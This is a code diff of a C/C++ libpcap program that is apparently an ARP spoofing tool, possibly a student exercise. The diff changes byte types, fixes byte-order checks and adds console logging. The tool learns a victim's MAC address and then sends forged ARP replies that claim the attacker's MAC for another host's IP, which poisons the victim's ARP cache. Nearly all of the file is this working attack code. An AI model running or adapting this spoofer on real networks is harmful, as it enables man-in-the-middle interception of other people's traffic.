@@ -10,8 +10,8 @@ using namespace std;
 
 // static is better than #define
 static const int ETHERTYPE_ARP = 0x0806;
-static const int ARPOP_REQUEST = 1;
-static const int ARPOP_REPLY = 2;
+static const int ARPOP_REQUEST = 0x0001;
+static const int ARPOP_REPLY = 0x0002;
 
 struct ether_hdr {
     uint8_t h_dest[6];	    /* destination eth addr	*/
@@ -41,7 +41,7 @@ void usage() {
     printf("sample: arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-int get_myinterface(char *dev, char my_mac[6]) {
+int get_myinterface(char *dev, uint8_t my_mac[6]) {
 
     // https://github.com/jungvely97/arp_spoof/blob/master/main.c
     // https://blog.naver.com/PostView.nhn?blogId=cumulusworld&logNo=220102945835
@@ -71,7 +71,7 @@ int get_myinterface(char *dev, char my_mac[6]) {
     return 0;
 }
 
-int send_arp_requestpacket(pcap_t* handle, char mac[6], char sip[4], char tip[4]) {
+int send_arp_requestpacket(pcap_t* handle, uint8_t mac[6], uint8_t sip[4], uint8_t tip[4]) {
 
     struct hdr_tosend *etharph = (struct hdr_tosend*)malloc(sizeof(struct hdr_tosend));
 
@@ -91,26 +91,26 @@ int send_arp_requestpacket(pcap_t* handle, char mac[6], char sip[4], char tip[4]
     memcpy(etharph->arph.__ar_tip, tip, 4);
 
     if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
-           fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
+           cout << " Error send arp request packet" << endl;
            return -1;
-    }
+    } else cout << " Send arp request packet" << endl;
     return 0;
 }
 
 int main(int argc, char *argv[])
 {
     if (argc != 4) {
-      usage();
-      return -1;
+        usage();
+        return -1;
     }
 
     // Variable declaration
-    char mac[6];
     char *dev = argv[1];
-    char *victimip = argv[2];
-    char *targetip = argv[3]; // = Gateway
-    char victim_mac[6];
     char errbuf[PCAP_ERRBUF_SIZE];
+    uint8_t mac[6];
+    uint8_t victim_mac[6];
+    uint8_t victim_ip[4];
+    uint8_t target_ip[4]; // = Gateway
 
     int res;
     int onetime = 0;
@@ -120,16 +120,17 @@ int main(int argc, char *argv[])
 
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
     if (handle == NULL) {
-      fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
-      return -1;
+        fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
+        return -1;
     }
 
     // GOOD
-    inet_pton(AF_INET, victimip, victimip);
-    inet_pton(AF_INET, targetip, targetip);
+    inet_pton(AF_INET, argv[2], victim_ip);
+    inet_pton(AF_INET, argv[3], target_ip);
 
+    cout << "*------ Start ------*" << endl;
     get_myinterface(dev, mac);
-    send_arp_requestpacket(handle, mac, targetip, victimip);
+    send_arp_requestpacket(handle, mac, target_ip, victim_ip);
 
     while(res = pcap_next_ex(handle, &header, &packet)) { // get captured packet data
 
@@ -137,24 +138,25 @@ int main(int argc, char *argv[])
         if (res == -1 || res == -2) break;
 
         etharph = (hdr_tosend*)packet;
+        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == htons(ARPOP_REPLY) && memcmp(etharph->eth.h_dest, mac, 6)==0 && onetime == 0) {
 
-        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == ARPOP_REPLY
-                && memcmp(etharph->eth.h_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) && memcmp(etharph->eth.h_source, mac, 6)) {
+            onetime = 1;
+            memcpy(victim_mac, etharph->eth.h_source, 6);
+            cout << " Get victim mac (for arp reply)" << endl;
+            cout << "*-------------------*" << endl << endl;
+        }
 
-            if(onetime == 0) { // Get victim mac
-                memcpy(victim_mac, etharph->eth.h_source, 6);
-                onetime = 1;
-            }
+        if(etharph->eth.h_proto == htons(ETHERTYPE_ARP) && etharph->arph.ar_op == htons(ARPOP_REPLY) && memcmp(etharph->eth.h_dest, mac, 6)==0 && onetime == 1) {
 
             // Sender : Attacker mac address
             memcpy(etharph->arph.__ar_sha, mac, 6);
             memcpy(etharph->eth.h_source, mac, 6);
-            memcpy(etharph->arph.__ar_sip, victimip, 4);
+            memcpy(etharph->arph.__ar_sip, victim_ip, 4);
 
             // Target
             memcpy(etharph->eth.h_dest, victim_mac, 6);
             memcpy(etharph->arph.__ar_tha, victim_mac, 6);
-            memcpy(etharph->arph.__ar_tip, targetip, 4);
+            memcpy(etharph->arph.__ar_tip, target_ip, 4);
 
             etharph->eth.h_proto = htons(ETHERTYPE_ARP);
             etharph->arph.ar_hrd = htons(0x0001);
@@ -164,11 +166,10 @@ int main(int argc, char *argv[])
             etharph->arph.ar_op = htons(0x0002);
 
             if (pcap_sendpacket(handle, (const u_char*)etharph, 42) != 0) {
-                   fprintf(stderr,"\nError sending the packet: \n", pcap_geterr(handle));
+                   cout << "Error send arp reply packet" << endl;
                    return -1;
-            }
+            } else cout << "Send arp reply packet" << endl;
         }
     }
     pcap_close(handle);
 }
-
